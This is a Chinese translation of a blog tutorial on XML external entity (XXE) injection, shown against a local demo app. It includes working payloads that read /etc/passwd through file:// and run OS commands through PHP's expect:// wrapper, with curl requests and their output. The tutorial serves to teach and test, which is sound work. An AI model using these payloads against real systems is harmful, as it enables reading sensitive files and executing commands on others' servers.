<html>
<head>
<title>Exploiting XXE Vulnerabilities</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">利用XXE的弱点</h1>
<blockquote>原文：<a href="https://itnext.io/exploiting-xxe-vulnerabilities-55b4bab7d1bd?source=collection_archive---------5-----------------------#2022-02-21">https://itnext.io/exploiting-xxe-vulnerabilities-55b4bab7d1bd?source=collection_archive---------5-----------------------#2022-02-21</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi jq"><img src="../Images/2cde92e16a7c3e5a00b8ed1022acf4cf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pbTMwC3RTj0NY4LUex8D6Q.png"/></div></div></figure><blockquote class="kb kc kd"><p id="aec6" class="ke kf kg kh b ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc im bi translated">原帖:<a class="ae ld" href="https://keiran.scot/2022/02/10/exploiting-xxe-vulnerabilities/" rel="noopener ugc nofollow" target="_blank">https://keiran . scot/2022/02/10/exploining-xxe-vulnerabilities/</a></p></blockquote><p id="05d4" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">XML外部实体注入(也称为XXE)是一个web安全漏洞，使得攻击者能够干扰应用程序对XML数据的处理。它通常允许攻击者查看应用程序服务器文件系统上的文件，并与应用程序本身可以访问的任何后端或外部系统进行交互，对于PHP，这可能导致命令执行。</p><h1 id="9c10" class="lh li it bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">那么什么是XML实体呢？</h1><p id="85d6" class="pw-post-body-paragraph ke kf it kh b ki mf kk kl km mg ko kp le mh ks kt lf mi kw kx lg mj la lb lc im bi translated">XML实体是在XML文档中表示数据项的一种方式。有许多预定义的内部实体，例如,<code class="fe mk ml mm mn b">&amp;amp;</code>代表与符号(&amp;),<code class="fe mk ml mm mn b">&amp;lt; and &amp;gt;</code>分别代表&lt;和&gt;。这些字符如果直接放在XML文档中，可能会改变XML标记和数据，因此需要表示为实体。</p><h1 id="129a" class="lh li it bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">什么是自定义实体？</h1><p id="5e4d" class="pw-post-body-paragraph ke kf it kh b ki mf kk kl km mg ko kp le mh ks kt lf mi kw kx lg mj la lb lc im bi translated">XML为我们提供了一种使用文档类型定义(DTD)来声明XML文档结构的方法。它为我们提供了在文档开头使用<code class="fe mk ml mm mn b">DOCTYPE</code>元素提供定制类型的能力。</p><p id="fc92" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">XML还允许在定义doctype时使用<code class="fe mk ml mm mn b">ENTITY</code>元素在DTD中定义定制实体。例如:</p><pre class="mo mp mq mr gt ms mn mt mu aw mv bi"><span id="5e38" class="mw li it mn b gy mx my l mz na">&lt;!DOCTYPE demodoc [ &lt;!ENTITY customentity "Hello World!" &gt; ]&gt;</span></pre><p id="1fd4" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">这个文档定义将用字符串<em class="kg">“Hello World”</em>替换任何对<code class="fe mk ml mm mn b">&amp;customentity;</code>的引用。</p><h1 id="d3bc" class="lh li it bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">什么是外部实体？</h1><p id="65e5" class="pw-post-body-paragraph ke kf it kh b ki mf kk kl km mg ko kp le mh ks kt lf mi kw kx lg mj la lb lc im bi translated">外部实体是一种自定义实体，它依赖于不属于DTD的定义。为了做到这一点，当我们定义一个实体时，我们可以使用<code class="fe mk ml mm mn b">SYSTEM</code>关键字。例如:</p><pre class="mo mp mq mr gt ms mn mt mu aw mv bi"><span id="bff5" class="mw li it mn b gy mx my l mz na">&lt;!DOCTYPE demodoc [ &lt;!ENTITY customentity SYSTEM "http://keiran.scot" &gt; ]&gt;</span></pre><p id="4523" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">有了这个定义，我们用定义的url内容替换了<code class="fe mk ml mm mn b">&amp;customentity;</code>引用。</p><p id="431a" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">如果您打算从XML处理器执行SSRF攻击，这非常有用</p><h1 id="b7b0" class="lh li it bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">我们如何利用这一点？</h1><p id="0249" class="pw-post-body-paragraph ke kf it kh b ki mf kk kl km mg ko kp le mh ks kt lf mi kw kx lg mj la lb lc im bi translated">当我们发现一个使用XML传输数据的目标时，我们可以拦截这个请求，或者提交一个修改过的XML文档，甚至是一个SVG或DOCX，带有一个外部实体。</p><p id="016f" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">正如我们从前面所知道的，我们可以使用SYSTEM关键字定义一个外部实体来调用URL，这有很多优点，并且使我们能够调用系统上注册的其他协议处理程序。</p><p id="b441" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">通过使用<code class="fe mk ml mm mn b">file://</code>协议处理程序，我们可以提取系统中一个文件的内容。</p><p id="7da1" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">例如，以下XML文档在传递给易受攻击的XML处理程序时，将读取/etc/passwd的内容。</p><pre class="mo mp mq mr gt ms mn mt mu aw mv bi"><span id="c20f" class="mw li it mn b gy mx my l mz na">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;<br/>&lt;!DOCTYPE root [<br/>    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;<br/>]&gt;<br/>&lt;root&gt;<br/>    &lt;name&gt;&lt;/name&gt;<br/>    &lt;email&gt;&amp;xxe;&lt;/email&gt;<br/>&lt;/root&gt;</span></pre><p id="af92" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">如果我们将此消息发布到易受攻击的应用程序，就会显示该文件的内容</p><pre class="mo mp mq mr gt ms mn mt mu aw mv bi"><span id="ccef" class="mw li it mn b gy mx my l mz na">$ curl -X POST -d @xml-document.xml http://localhost:8080<br/>root:x:0:0:root:/root:/bin/bash<br/>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br/>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br/>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br/>sync:x:4:65534:sync:/bin:/bin/sync<br/>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br/>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br/>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br/>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br/>...</span></pre><h1 id="c2e3" class="lh li it bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">命令执行</h1><p id="f9f3" class="pw-post-body-paragraph ke kf it kh b ki mf kk kl km mg ko kp le mh ks kt lf mi kw kx lg mj la lb lc im bi translated">大多数语言都没有从XML处理器执行操作系统命令的方法，但是对于PHP，当<a class="ae ld" href="https://www.php.net/manual/en/wrappers.expect.php" rel="noopener ugc nofollow" target="_blank"> expect模块</a>被启用时，情况会有所不同。</p><p id="9a2d" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">expect模块注册了一个PHP包装器(<code class="fe mk ml mm mn b">expect://</code>)，可以用来运行OS命令。</p><p id="737c" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">如果我们修改上面的XML文档来运行像<code class="fe mk ml mm mn b">id</code>这样的操作系统命令，它将从命令中转储出<code class="fe mk ml mm mn b">STDOUT</code>内容。</p><pre class="mo mp mq mr gt ms mn mt mu aw mv bi"><span id="a075" class="mw li it mn b gy mx my l mz na">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;<br/>&lt;!DOCTYPE root [<br/>    &lt;!ENTITY xxe SYSTEM "expect://id"&gt;<br/>]&gt;<br/>&lt;root&gt;<br/>    &lt;name&gt;&lt;/name&gt;<br/>    &lt;email&gt;&amp;xxe;&lt;/email&gt;<br/>&lt;/root&gt;</span><span id="c319" class="mw li it mn b gy nb my l mz na">$ curl -X POST -d @xml/exect.xml http://localhost:8080<br/>uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></pre><h1 id="d758" class="lh li it bd lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me bi translated">包扎</h1><p id="a997" class="pw-post-body-paragraph ke kf it kh b ki mf kk kl km mg ko kp le mh ks kt lf mi kw kx lg mj la lb lc im bi translated">正如我们所了解的，可以使用外部实体利用XML来泄漏数据，在某些情况下，可以导致命令执行。</p><p id="8454" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">我已经将演示PHP应用程序和Dockerfile上传到了<a class="ae ld" href="https://github.com/affix/vulnerable-containers/tree/main/XXE" rel="noopener ugc nofollow" target="_blank"> Github </a>上，所以你可以自己尝试一下，我还包含了一个用python编写的漏洞脚本。</p><p id="4cd5" class="pw-post-body-paragraph ke kf it kh b ki kj kk kl km kn ko kp le kr ks kt lf kv kw kx lg kz la lb lc im bi translated">如果你喜欢这个指南，请给我买杯咖啡吧！</p></div></div>    
</body>
</html>